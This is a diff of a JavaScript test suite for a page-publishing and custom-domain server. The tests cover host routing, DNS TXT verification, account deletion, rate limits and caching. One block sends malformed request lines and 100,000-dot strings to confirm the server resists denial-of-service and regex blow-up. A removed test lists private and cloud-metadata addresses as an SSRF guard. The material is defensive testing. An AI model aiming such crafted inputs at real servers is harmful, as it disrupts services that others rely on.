+  it('answers with the app on the hosts in APP_HOSTS and ALLOWED_ORIGIN, and nobody can claim them', async () => {
+    const s = await startServer({ APP_HOSTS: 'App.MyBiz.test, www.mybiz.test', ALLOWED_ORIGIN: 'https://studio.mybiz.test' });
+    try {
+      expect(s.log()).toContain('and on app.mybiz.test, www.mybiz.test, studio.mybiz.test (APP_HOSTS, ALLOWED_ORIGIN)');
+      for (const host of ['app.mybiz.test', 'www.mybiz.test:443', 'studio.mybiz.test']) {
+        const res = await request(s.base, '/api/config', { host });
+        expect(asJson(res), host).toBe(true);
+      }
+      for (const domain of ['app.mybiz.test', 'studio.mybiz.test']) {
+        const res = await request(s.base, '/api/domains', { method: 'POST', host: 'yourlocalbusiness.replit.app', headers: { authorization: `Bearer ${bob.token}`, 'content-type': 'application/json' }, body: JSON.stringify({ domain }) });
+        expect(res.status, domain).toBe(400);
+        expect(JSON.parse(res.text).code, domain).toBe('BAD_DOMAIN');
+      }
+      // and any other host still isn't the app
+      expect((await request(s.base, '/api/config', { host: 'other.mybiz.test' })).status).toBe(404);
+    } finally {
+      s.proc.kill();
+    }
+  });
+});
+
+describe('requests built to hurt', () => {
+  it('answers request targets that aren’t an address it can read, and keeps running', async () => {
+    for (const target of ['//', '//x:y', '//[', '//h:99999', '/%zz']) {
+      const line = await raw(app.base, `GET ${target} HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n`);
+      // a path like any other: the app (or "build it first"), or 400 for one that can't be decoded
+      expect(line, target).toMatch(/^HTTP\/1\.1 (200|400|404) /);
+      expect((await fetch(`${app.base}/api/config`)).status, target).toBe(200);
+    }
+    // an absolute target that isn't an address at all
+    expect(await raw(app.base, 'GET http://[ HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n')).toMatch(/^HTTP\/1\.1 400 /);
+    // on someone's domain too
+    expect(await raw(app.base, 'GET //x:y HTTP/1.1\r\nHost: kept.example.com\r\nConnection: close\r\n\r\n')).toMatch(/^HTTP\/1\.1 404 /);
+    expect(child.exitCode).toBeNull();
+    expect((await fetch(`${app.base}/api/config`)).status).toBe(200);
+  });
+
+  it('turns down 100,000 dots in a body at once, while visitors are served', async () => {
+    const dots = `${'.'.repeat(100_000)}x`;
+    const t0 = Date.now();
+    const [added, published, visitor] = await Promise.all([
+      // the domains API reads a small body only: it answers 413 and drops the connection
+      request(app.base, '/api/domains', { method: 'POST', headers: { authorization: `Bearer ${bob.token}`, 'content-type': 'application/json' }, body: JSON.stringify({ domain: dots }) }).then(
+        (r) => r.status,
+        () => 'closed',
+      ),
+      publish(bob, 'seo:dots1', { slug: 'bob-dots', domain: dots }),
+      get('/alice-widget'),
+    ]);
+    expect(Date.now() - t0).toBeLessThan(2000);
+    expect([413, 'closed']).toContain(added);
+    expect(published.status).toBe(400);
+    expect((await published.json()).code).toBe('BAD_DOMAIN');
+    expect(visitor.status).toBe(200);
+    // as many dots as fit in that body
+    const r = await addDomain(bob, `${'.'.repeat(15_000)}x`);
+    expect(r.status).toBe(400);
+    expect((await r.json()).code).toBe('BAD_DOMAIN');
+    expect(Date.now() - t0).toBeLessThan(2000);
+    expect(child.exitCode).toBeNull();
+  });
+
+  it('turns down long runs of dots in the address and the Host header at once', async () => {
+    const t0 = Date.now();
+    // the most Node lets through in a request line or header (16 KB; the module's own test sends 100,000)
+    const r = await api(`/api/domains/${'.'.repeat(15_000)}x/check`, { who: bob, method: 'POST' });
+    expect(r.status).toBe(404);
+    const host = await get('/', { host: `${'.'.repeat(15_000)}x` });
+    expect(host.status).toBe(404);
+    expect(host.text).toContain('Page not found');
+    expect(Date.now() - t0).toBeLessThan(2000);
   });
 });
 
 describe('deleting an account', () => {
-  it('removes the person’s published pages and their images', async () => {
+  it('removes the person’s published pages and their images, and their sign-in can’t store anything after', async () => {
     const carol = await supa.tokenFor('carol@pages.test');
     expect((await publish(carol, 'seo:c1', { slug: 'carol-bakes', images: [image('img-1.jpg', 'image/jpeg', JPEG)] })).status).toBe(200);
-    expect((await api('/api/domains', { who: carol, method: 'POST', body: { domain: 'carol-bakes.example.com' } })).status).toBe(200);
+    const { token } = await (await addDomain(carol, 'carol-bakes.example.com')).json();
+    txt('carol-bakes.example.com', token);
+    expect(await checkDomain(carol, 'carol-bakes.example.com')).toMatchObject({ verified: true });
     expect((await get('/carol-bakes')).status).toBe(200);
     supa.objects.set(`media/${carol.user.id}/media_photo1`, { bytes: JPEG, type: 'image/jpeg', created: Date.now() });
     const r = await fetch(`${app.base}/api/account`, { method: 'DELETE', headers: { authorization: `Bearer ${carol.token}` } });
     expect(r.status).toBe(200);
-    expect([...supa.objects.keys()].some((k) => k.startsWith(`media/${carol.user.id}/`))).toBe(false);
+    expect(objectsUnder(`media/${carol.user.id}/`)).toEqual([]);
     expect(rowsOf('published_pages').some((p) => p.user_id === carol.user.id)).toBe(false);
     expect(rowsOf('published_domains').some((d) => d.user_id === carol.user.id)).toBe(false);
     expect((await get('/carol-bakes')).status).toBe(404);
+    // the domain (still pointing here) shows nothing, not the app
+    const there = await at('carol-bakes.example.com', '/api/config');
+    expect(there.status).toBe(404);
+    expect(there.text).toContain('Page not found');
+    // the same access token still checks out until it expires, but nothing is stored for it
+    const again = await publish(carol, 'seo:ghost1', { slug: 'ghost-page', images: [image('img-1.png', 'image/png', PNG), image('img-2.png', 'image/png', PNG)] });
+    expect(again.status).toBe(401);
+    expect(await again.json()).toEqual({ error: 'This account doesn’t exist anymore. Sign in again.', code: 'ACCOUNT_GONE' });
+    expect(objectsUnder(`media/${carol.user.id}/`)).toEqual([]);
+    expect(rowsOf('published_pages').some((p) => p.slug === 'ghost-page')).toBe(false);
   });
 });
 
 // ───────────── the module on its own ─────────────
 
-/** pages.mjs behind a bare server, routed like ai-server.mjs. */
-async function startPages({ mock, secretKey, distDir = '' }) {
+/** No DNS answers anything (the module tests never reach a real DNS server). */
+const noDns = async () => {
+  throw Object.assign(new Error('no such name'), { code: 'ENOTFOUND' });
+};
+
+/** pages.mjs behind a bare server, routed like ai-server.mjs (with room for very long headers). */
+async function startPages({ mock, secretKey, distDir = '', resolveTxt = noDns, lookupLimits, tuning, fetch: fetchImpl }) {
   const auth = createAuth({ supabaseUrl: mock.url, publishableKey: mock.PUBLISHABLE });
   const send = (res, status, body, headers = {}) => {
     res.writeHead(status, { 'content-type': 'application/json', ...headers });
     res.end(JSON.stringify(body));
   };
-  const readJson = (req) =>
-    new Promise((resolve) => {
+  const readJson = (req, limit = 14 * 1024 * 1024) =>
+    new Promise((resolve, reject) => {
       let raw = '';
-      req.on('data', (c) => (raw += c));
+      req.on('data', (c) => {
+        raw += c;
+        if (raw.length > limit) reject(Object.assign(new Error('Request too large'), { status: 413 }));
+      });
       req.on('end', () => resolve(JSON.parse(raw || '{}')));
     });
   const whoIs = async (req) => (req.headers.authorization ? { who: await auth.identify(req) } : { who: null });
-  const pages = createPages({ supabaseUrl: mock.url, secretKey, auth, whoIs, send, readJson, distDir });
-  const server = http.createServer(async (req, res) => {
-    const url = new URL(req.url, 'http://local');
-    if (pages.mayBeDomain(req) && (await pages.serveDomain(req, res, url))) return;
+  const pages = createPages({ supabaseUrl: mock.url, secretKey, auth, whoIs, send, readJson, distDir, resolveTxt, ...(lookupLimits ? { lookupLimits } : {}), ...(tuning ? { tuning } : {}), ...(fetchImpl ? { fetch: fetchImpl } : {}) });
+  const server = http.createServer({ maxHeaderSize: 1024 * 1024 }, async (req, res) => {
+    const url = new URL(`http://local${req.url}`);
+    if (!pages.isAppHost(req)) return pages.serveDomain(req, res, url);
     if (pages.matchApi(url)) return pages.handleApi(req, res, url);
     if (pages.matchPage(url) && (await pages.servePage(req, res, url))) return;
     res.writeHead(200, { 'content-type': 'text/plain' });
     res.end('the app');
   });
   await new Promise((r) => server.listen(0, '127.0.0.1', r));
-  return { pages, base: `http://127.0.0.1:${server.address().port}`, close: () => new Promise((r) => server.close(r)) };
+  const base = `http://127.0.0.1:${server.address().port}`;
+  return {
+    pages,
+    base,
+    api: (pathname, { who, method = 'GET', body } = {}) => fetch(`${base}${pathname}`, { method, headers: { 'content-type': 'application/json', ...(who ? { authorization: `Bearer ${who.token}` } : {}) }, ...(body === undefined ? {} : { body: JSON.stringify(body) }) }),
+    close: () => {
+      pages.close();
+      return new Promise((r) => server.close(r));
+    },
+  };
 }
+
+/** A published row straight into the stand-in (as if published through another copy of the server). */
+const putRow = (mock, row) => {
+  if (!mock.tables.has('published_pages')) mock.tables.set('published_pages', []);
+  mock.tables.get('published_pages').push({ user_id: alice.user.id, kind: 'seo', title: 't', images: [], domain: null, home: false, updated_at: new Date().toISOString(), ...row });
+};
+const from = (ip) => ({ headers: { 'x-forwarded-for': ip } });
 
 describe('without the setup', () => {
   it('is off without the secret key, and says so', async () => {
@@ -510,9 +792,11 @@ describe('without the setup', () => {
       const r = await fetch(`${s.base}/api/pages`, { headers: { authorization: `Bearer ${alice.token}` } });
       expect(r.status).toBe(503);
       expect((await r.json()).code).toBe('PAGES_OFF');
-      // and nothing changes for the app's own paths or hosts
+      // and nothing changes for the app's own paths; any other host is still nobody's app
       expect((await request(s.base, '/alice-widget')).text).toBe('the app');
-      expect((await request(s.base, '/', { host: 'shop.example.com' })).text).toBe('the app');
+      const other = await request(s.base, '/', { host: 'shop.example.com' });
+      expect(other.status).toBe(404);
+      expect(other.text).toContain('Page not found');
     } finally {
       await s.close();
     }
@@ -528,9 +812,9 @@ describe('without the setup', () => {
         expect(r.status, p).toBe(503);
         expect(await r.json(), p).toEqual({ error: MIGRATION_HINT, code: 'PAGES_TABLES' });
       }
-      // visitors: nothing is published yet, and no host is anyone's domain
+      // visitors: nothing is published yet, and no host is anyone's domain (nor the app)
       expect((await request(s.base, '/dana-page')).status).toBe(404);
-      expect((await request(s.base, '/', { host: 'dana.example.com' })).text).toBe('the app');
+      expect((await request(s.base, '/', { host: 'dana.example.com' })).status).toBe(404);
     } finally {
       await s.close();
       await bare.close();
@@ -554,15 +838,222 @@ describe('without the setup', () => {
   });
 });
 
+describe('visitors’ lookups', () => {
+  it('limits what each client can look up, apart from everyone else, with domains counted apart from pages', async () => {
+    const s = await startPages({ mock: supa, secretKey: supa.SECRET, lookupLimits: { page: { perMin: 100, perClient: 5 }, domain: { perMin: 100, perClient: 3 }, image: { perMin: 100, perClient: 5 } } });
+    try {
+      putRow(supa, { slug: 'limits-page', page_id: 'seo:lim1', html: '<h1>Limits</h1>' });
+      const a = from('203.0.113.7');
+      for (let i = 0; i < 5; i++) expect((await request(s.base, `/random-a-${i}`, a)).status).toBe(404);
+      // a's lookups are spent: a name nobody asked about yet can't be looked up for a
+      expect((await request(s.base, '/limits-page', a)).status).toBe(503);
+      // answers already known cost nothing
+      expect((await request(s.base, '/random-a-0', a)).status).toBe(404);
+      // other clients aren't affected
+      expect((await request(s.base, '/limits-page', from('198.51.100.2'))).status).toBe(200);
+      // (an IPv6 client is one client for its whole /64)
+      expect((await request(s.base, '/random-v6-1', from('2001:db8:5:6::1'))).status).toBe(404);
+      for (let i = 2; i <= 5; i++) await request(s.base, `/random-v6-${i}`, from(`2001:db8:5:6::${i}`));
+      expect((await request(s.base, '/random-v6-6', from('2001:db8:5:6:ffff::9'))).status).toBe(503);
+      // random hosts spend the domain lookups, not the pages'
+      const c = from('192.0.2.10');
+      for (let i = 0; i < 3; i++) expect((await request(s.base, '/', { ...c, host: `random-${i}.example.net` })).status).toBe(404);
+      expect((await request(s.base, '/', { ...c, host: 'random-3.example.net' })).status).toBe(503);
+      expect((await request(s.base, '/random-c-1', c)).status).toBe(404);
+    } finally {
+      await s.close();
+    }
+  });
+
+  it('falls back on an answer it had only while Supabase fails, and never past twice its time', async () => {
+    const mock = await (await createMockSupabase()).start();
+    const s = await startPages({ mock, secretKey: mock.SECRET, tuning: { pageTtl: 400 } });
+    try {
+      putRow(mock, { user_id: (await mock.tokenFor('erin@pages.test')).user.id, slug: 'erin-page', page_id: 'seo:e1', html: '<h1>Erin</h1>' });
+      expect((await request(s.base, '/erin-page')).status).toBe(200);
+      mock.behavior.down = true;
+      await sleep(500); // past its time (400 ms), not past twice that
+      expect((await request(s.base, '/erin-page')).text).toContain('Erin');
+      await sleep(400); // past 800 ms
+      expect((await request(s.base, '/erin-page')).status).toBe(503);
+    } finally {
+      mock.behavior.down = false;
+      await s.close();
+      await mock.close();
+    }
+  });
+
+  it('never falls back on an old answer because a client’s lookups are spent (a removed page would stay up)', async () => {
+    const mock = await (await createMockSupabase()).start();
+    const s = await startPages({ mock, secretKey: mock.SECRET, tuning: { pageTtl: 300 }, lookupLimits: { page: { perMin: 100, perClient: 2 }, domain: { perMin: 100, perClient: 2 }, image: { perMin: 100, perClient: 2 } } });
+    try {
+      putRow(mock, { user_id: (await mock.tokenFor('finn@pages.test')).user.id, slug: 'finn-page', page_id: 'seo:f1', html: '<h1>Finn</h1>' });
+      const y = from('203.0.113.50');
+      expect((await request(s.base, '/finn-page', y)).status).toBe(200);
+      expect((await request(s.base, '/random-y-1', y)).status).toBe(404);
+      // unpublished meanwhile (on another copy of the server)
+      mock.tables.set('published_pages', []);
+      await sleep(350);
+      expect((await request(s.base, '/finn-page', y)).status).toBe(503);
+      expect((await request(s.base, '/finn-page', from('203.0.113.51'))).status).toBe(404);
+    } finally {
+      await s.close();
+      await mock.close();
+    }
+  });
+
+  it('keeps pages within its bytes, a big page without its HTML, and drops answers past their time', async () => {
+    const mock = await (await createMockSupabase()).start();
+    const s = await startPages({ mock, secretKey: mock.SECRET, tuning: { pageTtl: 300, pageHtmlMax: 1000, pageCacheBytes: 12_000 } });
+    try {
+      const uid = (await mock.tokenFor('gale@pages.test')).user.id;
+      const bigHtml = `<h1>Big</h1><p>${'b'.repeat(5000)}</p>`;
+      putRow(mock, { user_id: uid, slug: 'gale-big', page_id: 'artifact:g0', html: bigHtml });
+      for (let i = 1; i <= 12; i++) putRow(mock, { user_id: uid, slug: `gale-small-${i}`, page_id: `seo:g${i}`, html: `<h1>Small ${i}</h1><p>${'s'.repeat(600)}</p>` });
+      const reads = () => mock.calls.filter((c) => c.path === '/rest/v1/published_pages' && c.method === 'GET').length;
+      // a big page: served whole each time, its HTML read again rather than kept
+      expect((await request(s.base, '/gale-big')).text).toBe(bigHtml);
+      expect(s.pages.cacheStats().pages.bytes).toBeLessThan(1500);
+      const before = reads();
+      expect((await request(s.base, '/gale-big')).text).toBe(bigHtml);
+      expect(reads()).toBe(before + 1);
+      // small pages: kept, within the bytes (the least recently used go first)
+      for (let i = 1; i <= 12; i++) expect((await request(s.base, `/gale-small-${i}`)).status).toBe(200);
+      const { bytes, entries } = s.pages.cacheStats().pages;
+      expect(bytes).toBeLessThanOrEqual(12_000);
+      expect(entries).toBeLessThan(13);
+      const now = reads();
+      expect((await request(s.base, '/gale-small-12')).status).toBe(200);
+      expect(reads()).toBe(now); // the most recent is still there
+      // past twice their time, answers go (with their HTML), even with nothing else coming in
+      await sleep(1000);
+      expect(s.pages.cacheStats().pages).toEqual({ entries: 0, bytes: 0 });
+    } finally {
+      await s.close();
+      await mock.close();
+    }
+  });
+});
+
+describe('domains, in the module', () => {
+  it('keeps a domain whose DNS can’t answer for now, and drops it once its record is gone', async () => {
+    const records = new Map();
+    let dnsDown = false;
+    const resolveTxt = async (name) => {
+      if (dnsDown) throw Object.assign(new Error('timeout'), { code: 'ETIMEOUT' });
+      if (!records.has(name)) throw Object.assign(new Error('no such name'), { code: 'ENOTFOUND' });
+      return records.get(name).map((v) => [v]);
+    };
+    const mock = await (await createMockSupabase()).start();
+    // look again at every visit
+    const s = await startPages({ mock, secretKey: mock.SECRET, resolveTxt, tuning: { recheckAfter: 0 } });
+    const until = async (test) => {
+      for (let i = 0; i < 100 && !(await test()); i++) await sleep(20);
+      return test();
+    };
+    try {
+      const hana = await mock.tokenFor('hana@pages.test');
+      const row = (domain) => mock.tables.get('published_domains').find((d) => d.domain === domain);
+      for (const domain of ['flaky.example.com', 'gone.example.com']) {
+        const { token } = await (await s.api('/api/domains', { who: hana, method: 'POST', body: { domain } })).json();
+        records.set(`_ylb-domain.${domain}`, [token]);
+        expect(await (await s.api(`/api/domains/${domain}/check`, { who: hana, method: 'POST' })).json()).toMatchObject({ verified: true });
+        const slug = domain.split('.')[0];
+        expect((await s.api(`/api/pages/seo%3A${slug}`, { who: hana, method: 'PUT', body: { slug: `${slug}-home`, html: `<h1>${slug}</h1>`, domain, home: true } })).status).toBe(200);
+        expect((await request(s.base, '/', { host: domain })).status).toBe(200);
+      }
+      // the DNS doesn't answer: still shown, still verified
+      dnsDown = true;
+      expect((await request(s.base, '/', { host: 'flaky.example.com' })).status).toBe(200);
+      await sleep(100);
+      expect((await request(s.base, '/', { host: 'flaky.example.com' })).status).toBe(200);
+      expect(row('flaky.example.com').verified_at).not.toBeNull();
+      dnsDown = false;
+      // the record is gone: no longer verified, and not shown
+      records.delete('_ylb-domain.gone.example.com');
+      expect(
+        await until(async () => {
+          await request(s.base, '/', { host: 'gone.example.com' });
+          return row('gone.example.com').verified_at === null;
+        }),
+      ).toBe(true);
+      expect((await request(s.base, '/', { host: 'gone.example.com' })).status).toBe(404);
+    } finally {
+      await s.close();
+      await mock.close();
+    }
+  });
+
+  it('turns down 100,000 dots in the address and the Host header at once', async () => {
+    const s = await startPages({ mock: supa, secretKey: supa.SECRET });
+    try {
+      const t0 = Date.now();
+      const r = await s.api(`/api/domains/${'.'.repeat(100_000)}x/check`, { who: bob, method: 'POST' });
+      expect(r.status).toBe(404);
+      const host = await request(s.base, '/', { host: `${'.'.repeat(100_000)}x` });
+      expect(host.status).toBe(404);
+      const fwd = await request(s.base, '/', { headers: { 'x-forwarded-host': `${'.'.repeat(100_000)}x` } });
+      expect(fwd.status).toBe(404);
+      expect(Date.now() - t0).toBeLessThan(2000);
+    } finally {
+      await s.close();
+    }
+  });
+});
+
 describe('helpers', () => {
   it('reads a domain the way people type it', () => {
     expect(normalizeDomain(' HTTPS://Shop.Example.com:8443/about?x=1#top ')).toBe('shop.example.com');
     expect(normalizeDomain('user:pw@www.shop.example.com.')).toBe('www.shop.example.com');
+    expect(normalizeDomain('shop.example.com....')).toBe('shop.example.com');
     expect(normalizeDomain('bücher.example')).toBe('xn--bcher-kva.example');
     expect(normalizeDomain('')).toBe('');
     expect(claimable('shop.example.com')).toBe(true);
-    for (const h of ['localhost', '10.0.0.1', 'app.replit.app', 'x.replit.dev', 'y.repl.co', 'a.localhost', 'nodot', '[::1]']) expect(claimable(h), h).toBe(false);
+    for (const h of ['localhost', '10.0.0.1', 'app.replit.app', 'x.replit.dev', 'y.repl.co', 'a.localhost', 'printer.local', 'db.internal', 'nas.home.arpa', 'nodot', '[::1]', '']) expect(claimable(h), h).toBe(false);
     expect(claimable('app.mybiz.com', new Set(['app.mybiz.com']))).toBe(false);
+  });
+
+  it('never runs a regex on something too long to be a domain', () => {
+    const dots = `${'.'.repeat(100_000)}x`;
+    const t0 = Date.now();
+    expect(normalizeDomain(dots)).toBe('');
+    expect(normalizeDomain(`${'.'.repeat(100_000)}`)).toBe('');
+    expect(hostOf({ headers: { host: dots }, socket: {} })).toBe('');
+    expect(hostOf({ headers: { host: `shop.example.com${'.'.repeat(250)}:443` }, socket: {} })).toBe('shop.example.com');
+    expect(Date.now() - t0).toBeLessThan(200);
+    expect(hostOf({ headers: { host: 'Shop.Example.com.:8080' }, socket: {} })).toBe('shop.example.com');
+    expect(hostOf({ headers: { host: '[::1]:8787' }, socket: {} })).toBe('[::1]');
+    // X-Forwarded-Host only from this machine (the Vite dev proxy)
+    expect(hostOf({ headers: { host: 'localhost:8787', 'x-forwarded-host': 'preview.replit.dev' }, socket: { remoteAddress: '127.0.0.1' } })).toBe('preview.replit.dev');
+    expect(hostOf({ headers: { host: 'shop.example.com', 'x-forwarded-host': 'app.replit.app' }, socket: { remoteAddress: '203.0.113.9' } })).toBe('shop.example.com');
+  });
+
+  it('tells clients apart by the address the platform reports', () => {
+    const req = (fwd, remoteAddress = '10.0.0.5') => ({ headers: fwd === undefined ? {} : { 'x-forwarded-for': fwd }, socket: { remoteAddress } });
+    expect(clientOf(req('203.0.113.9'))).toBe('203.0.113.9');
+    expect(clientOf(req('203.0.113.9, 10.0.0.2'))).toBe('203.0.113.9');
+    expect(clientOf(req('203.0.113.9:4711'))).toBe('203.0.113.9');
+    expect(clientOf(req('2001:db8:1:2:3:4:5:6'))).toBe('2001:db8:1:2::/64');
+    expect(clientOf(req('[2001:db8:1:2::9]:443'))).toBe('2001:db8:1:2::/64');
+    expect(clientOf(req('::ffff:198.51.100.4'))).toBe('198.51.100.4');
+    expect(clientOf(req('nonsense'))).toBe('10.0.0.5');
+    expect(clientOf(req(undefined, '::ffff:192.0.2.1'))).toBe('192.0.2.1');
+  });
+
+  it('asks the DNS for a TXT record and reads every answer it can give', async () => {
+    const dns = await createMockDns();
+    try {
+      dns.records.set('_ylb-domain.long.example.com', ['ylb-a', 'x'.repeat(600)]);
+      dns.records.set('_ylb-domain.empty.example.com', []);
+      dns.records.set('_ylb-domain.broken.example.com', 'SERVFAIL');
+      const resolveTxt = txtResolver(dns.server);
+      expect((await resolveTxt('_ylb-domain.long.example.com')).map((chunks) => chunks.join(''))).toEqual(['ylb-a', 'x'.repeat(600)]);
+      await expect(resolveTxt('_ylb-domain.empty.example.com')).rejects.toMatchObject({ code: 'ENODATA' });
+      await expect(resolveTxt('_ylb-domain.none.example.com')).rejects.toMatchObject({ code: 'ENOTFOUND' });
+      await expect(resolveTxt('_ylb-domain.broken.example.com')).rejects.toMatchObject({ code: 'ESERVFAIL' });
+    } finally {
+      await dns.close();
+    }
   });
 
   it('knows image types by their first bytes', () => {
@@ -572,15 +1063,5 @@ describe('helpers', () => {
     expect(imageTypeOf(WEBP)).toBe('image/webp');
     expect(imageTypeOf(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>'))).toBeNull();
     expect(imageTypeOf(Buffer.alloc(4))).toBeNull();
-  });
-
-  it('never checks a domain that points at a private address', async () => {
-    for (const a of ['127.0.0.1', '10.1.2.3', '172.16.0.9', '192.168.1.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '::1', 'fd00::1', 'fe80::1', '::ffff:10.0.0.1']) expect(isPrivateAddress(a), a).toBe(true);
-    for (const a of ['34.111.179.208', '2600:1f18::1', '::ffff:8.8.8.8']) expect(isPrivateAddress(a), a).toBe(false);
-    // the lookup the check connects with (localhost resolves from the hosts file, no network needed)
-    for (const options of [{}, { all: true }]) {
-      const err = await new Promise((r) => publicOnly('localhost', options, (e) => r(e)));
-      expect(err?.code, JSON.stringify(options)).toBe('EPRIVATE');
-    }
   });
 });
